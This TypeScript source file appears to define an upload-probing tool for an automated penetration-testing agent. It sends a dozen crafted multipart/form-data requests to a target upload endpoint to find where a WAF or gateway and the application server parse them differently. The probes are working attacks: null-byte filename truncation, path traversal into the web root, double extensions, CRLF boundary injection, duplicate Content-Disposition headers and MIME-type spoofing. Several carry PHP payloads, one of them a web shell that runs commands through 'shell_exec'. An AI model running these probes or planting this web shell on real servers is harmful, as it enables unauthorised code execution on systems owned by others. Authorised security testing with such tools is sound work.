// T35 — multipart_diff_probe
// Probes for multipart/form-data parsing differences between layers.
// Classic attacks: boundary injection in Content-Type, filename path traversal,
// duplicate Content-Disposition headers, extra parameters accepted by one parser
// but stripped by another (gateway vs business logic).

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'multipart_diff_probe',
  description:
    'Probe for multipart/form-data parser disagreement between layers. Tests boundary ' +
    'injection, duplicate Content-Disposition, filename path traversal, null-byte filename ' +
    'truncation, extra MIME parameters, and content-type confusion. Detects file-upload ' +
    'bypass where the WAF/gateway and the application server parse the same request differently.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',          type: 'string', required: true,  description: 'Upload endpoint URL' },
    { name: 'field',        type: 'string', required: false, description: 'File field name', default: 'file' },
    { name: 'filename',     type: 'string', required: false, description: 'Base filename to mutate', default: 'test.txt' },
    { name: 'content',      type: 'string', required: false, description: 'File body content', default: 'GENESIS-multipart-probe' },
    { name: 'headers',      type: 'string', required: false, description: 'JSON extra headers (auth, etc.)' },
    { name: 'timeout_ms',   type: 'number', required: false, description: 'Per-request timeout ms', default: 10000 },
  ],
};

function buildMultipart(
  field: string,
  filename: string,
  content: string,
  boundary: string,
  extraDisposition?: string,
  extraHeaders?: string,
): string {
  const cd = `Content-Disposition: form-data; name="${field}"; filename="${filename}"${extraDisposition ? `; ${extraDisposition}` : ''}`;
  const ct = extraHeaders ?? 'Content-Type: text/plain';
  return `--${boundary}\r\n${cd}\r\n${ct}\r\n\r\n${content}\r\n--${boundary}--\r\n`;
}

interface Probe {
  name: string;
  body: string;
  contentType: string;
  note: string;
}

function buildProbes(field: string, filename: string, content: string): Probe[] {
  const b = 'GENESISBoundary1337';
  const ext = filename.includes('.') ? filename.split('.').pop() ?? 'txt' : 'txt';
  const base = filename.replace(/\.[^.]+$/, '');

  return [
    // Baseline
    {
      name: 'baseline',
      body: buildMultipart(field, filename, content, b),
      contentType: `multipart/form-data; boundary=${b}`,
      note: 'Baseline — valid multipart',
    },
    // Null-byte filename truncation (some parsers stop at \x00, others don't)
    {
      name: 'null_byte_filename',
      body: buildMultipart(field, `${base}.php\x00.${ext}`, '<?php echo shell_exec($_GET["cmd"]); ?>', b),
      contentType: `multipart/form-data; boundary=${b}`,
      note: 'Null byte truncates .php suffix past the WAF',
    },
    // Path traversal in filename
    {
      name: 'path_traversal',
      body: buildMultipart(field, `../../var/www/html/${base}.php`, '<?php phpinfo(); ?>', b),
      contentType: `multipart/form-data; boundary=${b}`,
      note: 'Path traversal via filename — stored outside upload dir',
    },
    // Double extension
    {
      name: 'double_extension',
      body: buildMultipart(field, `${base}.php.${ext}`, '<?php phpinfo(); ?>', b),
      contentType: `multipart/form-data; boundary=${b}`,
      note: 'Double extension — some servers execute the first match',
    },
    // Boundary injection in filename
    {
      name: 'boundary_injection',
      body: buildMultipart(field, `${filename}\r\n--${b}\r\nContent-Disposition: form-data; name="injected"`, 'injected_value', b),
      contentType: `multipart/form-data; boundary=${b}`,
      note: 'CRLF boundary injection in filename parameter',
    },
    // Missing filename — some parsers default to empty string, others reject
    {
      name: 'missing_filename',
      body: `--${b}\r\nContent-Disposition: form-data; name="${field}"\r\nContent-Type: text/plain\r\n\r\n${content}\r\n--${b}--\r\n`,
      contentType: `multipart/form-data; boundary=${b}`,
      note: 'No filename parameter — triggers parser-specific defaults',
    },
    // Duplicate Content-Disposition (first vs last wins divergence)
    {
      name: 'duplicate_cd_last_wins',
      body: `--${b}\r\nContent-Disposition: form-data; name="${field}"; filename="safe.txt"\r\nContent-Disposition: form-data; name="${field}"; filename="${base}.php"\r\nContent-Type: text/plain\r\n\r\n<?php phpinfo(); ?>\r\n--${b}--\r\n`,
      contentType: `multipart/form-data; boundary=${b}`,
      note: 'Duplicate headers — WAF reads first (safe), server reads last (php)',
    },
    // Extra MIME parameter (some parsers are tripped by unknown params)
    {
      name: 'extra_mime_param',
      body: buildMultipart(field, filename, content, b, `modification-date="Mon, 01 Jan 2024 00:00:00 GMT"`),
      contentType: `multipart/form-data; boundary=${b}`,
      note: 'Extra Content-Disposition parameter trips strict parsers',
    },
    // Quoted boundary with injected semicolons
    {
      name: 'quoted_boundary',
      body: buildMultipart(field, filename, content, b),
      contentType: `multipart/form-data; boundary="${b}"; charset=utf-8`,
      note: 'Quoted boundary with extra CT params — parser confusion',
    },
    // Uppercase MIME headers
    {
      name: 'uppercase_headers',
      body: `--${b}\r\nCONTENT-DISPOSITION: form-data; name="${field}"; filename="${base}.php"\r\nCONTENT-TYPE: text/plain\r\n\r\n<?php phpinfo(); ?>\r\n--${b}--\r\n`,
      contentType: `multipart/form-data; boundary=${b}`,
      note: 'Uppercase MIME headers — case-sensitivity divergence',
    },
    // No boundary in Content-Type (some servers infer it)
    {
      name: 'no_boundary_param',
      body: buildMultipart(field, filename, content, b),
      contentType: 'multipart/form-data',
      note: 'Missing boundary parameter in Content-Type',
    },
    // Content-type spoofing (executable content with image MIME)
    {
      name: 'ct_spoof_image',
      body: `--${b}\r\nContent-Disposition: form-data; name="${field}"; filename="${base}.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php phpinfo(); ?>\r\n--${b}--\r\n`,
      contentType: `multipart/form-data; boundary=${b}`,
      note: 'PHP content declared as image/jpeg — type-based allow-list bypass',
    },
  ];
}

export const multipartDiffProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const field = String(params.field || 'file');
    const filename = String(params.filename || 'test.txt');
    const content = String(params.content || 'GENESIS-multipart-probe');
    const timeoutMs = Number(params.timeout_ms || 10000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    let extraHeaders: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(extraHeaders, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const probes = buildProbes(field, filename, content);
    const results: Array<{ name: string; status: number; body_excerpt: string; time_ms: number; interesting: boolean; note: string; error?: string }> = [];

    let baselineStatus = 0;

    for (const probe of probes) {
      const start = Date.now();
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const resp = await fetch(url, {
          method: 'POST',
          headers: { ...extraHeaders, 'Content-Type': probe.contentType },
          body: probe.body,
          signal: controller.signal,
        });
        clearTimeout(timer);
        const text = await resp.text();
        if (probe.name === 'baseline') baselineStatus = resp.status;
        const interesting = probe.name !== 'baseline' && (
          resp.status !== baselineStatus ||
          /phpinfo|php version|upload.*success/i.test(text)
        );
        results.push({ name: probe.name, status: resp.status, body_excerpt: text.substring(0, 80).replace(/\s+/g, ' '), time_ms: Date.now() - start, interesting, note: probe.note });
      } catch (err) {
        results.push({ name: probe.name, status: 0, body_excerpt: '', time_ms: Date.now() - start, interesting: false, note: probe.note, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `multipart_diff_probe — ${probes.length} multipart variants against ${url.substring(0, 80)}`,
      `Field: "${field}"  Filename: "${filename}"  Baseline status: ${baselineStatus}`,
      `Interesting (diverged from baseline): ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ DIVERGENT  ' : (r.error ? '✗ ERR        ' : '  ·          ');
      lines.push(`  ${flag}  [${r.name.padEnd(24)}]  status=${r.status}  ${r.note}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { field, filename, baseline_status: baselineStatus, total: results.length, interesting_count: interesting.length, interesting, results },
    };
  },
};
